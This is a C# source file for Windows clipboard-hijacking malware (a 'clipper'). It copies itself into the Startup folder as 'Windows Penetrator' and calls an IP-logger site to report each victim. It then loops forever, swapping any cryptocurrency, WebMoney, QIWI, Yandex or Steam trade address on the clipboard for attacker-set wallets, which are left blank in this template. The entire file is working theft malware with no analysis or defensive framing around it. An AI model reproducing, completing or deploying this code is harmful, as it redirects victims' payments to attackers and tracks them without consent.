using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper
{
    internal sealed class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            try
            {
                Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
                STAThread.SetApartmentState(ApartmentState.STA);
                STAThread.Start();
                STAThread.Join();

            }
            catch { }
            return ReturnValue;

        }
        public static void SetText(string text)
        {
            Thread STAThread = new Thread(
            delegate ()
            {
                try
                {
                    System.Windows.Forms.Clipboard.SetText(text);
                }
                catch { };
            });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }

    }

    class Program
    {
        static void Main()
        {
            string startup_directory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string executable = System.Reflection.Assembly.GetEntryAssembly().Location;
            FileInfo file = new FileInfo(executable);
            string previous_buffer = "";
            string autorun_name = "Windows Penetrator"; // название файла в автозагрузке
            Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
            {
                {"wmr", new Regex(@"R[0-9]{12}") },
                {"wmg", new Regex(@"G[0-9]{12}") },
                {"wmz", new Regex(@"Z[0-9]{12}") },
                {"wmh", new Regex(@"H[0-9]{12}") },
                {"wmu", new Regex(@"U[0-9]{12}") },
                {"wmx", new Regex(@"X[0-9]{12}") },
                {"qiwiua", new Regex(@"380[0-9]{9}") },
                {"qiwiru", new Regex(@"79[0-9]{9}") },
                {"yandex", new Regex(@"41001[0-9]{10}") },
                {"steam", new Regex(@"steamcommunity[.]com/tradeoffer/new/[?]partner=[0-9]{9}&token=[A-z0-9_]{8}") },
                {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)") },
                {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") },
                {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") },
                {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") },
                {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") },
                {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") },
                {"nec", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") },
                {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") },
                {"bcn", new Regex(@"2[1-9A-z]{105}") },
                {"ada", new Regex(@"DdzFFzCqrht[1-9A-z]{93}") },
                {"grft", new Regex(@"G[1-9][1-9A-z]{93}") },
                {"zcash", new Regex(@"t1[0-9A-z]{33}") },
                {"btg", new Regex(@"G[A-z][1-9A-z]{32}") },
                {"waves", new Regex(@"3P[1-9A-z]{33}") },
                {"rdd", new Regex(@"R[1-9a-z][1-9A-z]{32}") },
                {"blk", new Regex(@"B[1-9a-z][1-9A-z]{32}") },
                {"emc", new Regex(@"E[A-z][1-9A-z]{32}") },
                {"strat", new Regex(@"S[A-z][1-9A-z]{32}") },
                {"qtum", new Regex(@"Q[A-z][1-9A-z]{32}") },
                {"via", new Regex(@"V[a-z][A-z][1-9A-z]{31}") },
                {"lsk", new Regex(@"[0-9]{20}L") },
                {"doge", new Regex(@"D[A-Z1-9][1-9A-z]{32}") },
                {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") }
            };
            Dictionary<string, string> wallets = new Dictionary<string, string>()
            {
                {"wmr", "" },
                {"wmg", "" },
                {"wmz", "" },
                {"wmh", "" },
                {"wmu", "" },
                {"wmx", "" },
                {"qiwiua", "" },
                {"qiwiru", "" },
                {"yandex", "" },
                {"steam", "" },
                {"btc", "" },
                {"eth", "" },
                {"xmr", "" },
                {"xlm", "" },
                {"xrp", "" },
                {"ltc", "" },
                {"nec", "" },
                {"bch", "" },
                {"bcn", "" },
                {"ada", "" },
                {"grft", "" },
                {"zcash", ""},
                {"btg", "" },
                {"waves", "" },
                {"rdd", "" },
                {"blk", "" },
                {"emc", "" },
                {"strat", "" },
                {"qtum", "" },
                {"via", "" },
                {"lsk", "" },
                {"doge", "" },
                {"dash", "" }
            };
            bool createdNew = false;
            Mutex currentApp = new Mutex(false, "dwfdcf", out createdNew);
            if (!createdNew)
            {
                Environment.Exit(1);
            }
            if (!File.Exists($"{startup_directory}\\{autorun_name}.exe"))
            {
                File.Copy(executable, $@"{startup_directory}\{autorun_name}.exe");
            }
            WebRequest.Create("https://iplogger.ru").GetResponse(); // ссылка на айпилоггер
            while (true)
            {
                string buffer = Clipboard.GetText();
                if (previous_buffer != buffer)
                {
                    if (!string.IsNullOrEmpty(buffer))
                    {
                        foreach (KeyValuePair<string, Regex> dictonary in patterns)
                        {
                            string cryptocurrency = dictonary.Key;
                            Regex pattern = dictonary.Value;
                            if (pattern.Match(buffer).Success)
                            {
                                string replace_to = wallets[cryptocurrency];
                                if (!string.IsNullOrEmpty(replace_to) && !buffer.Equals(replace_to))
                                {
                                    Clipboard.SetText(replace_to);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
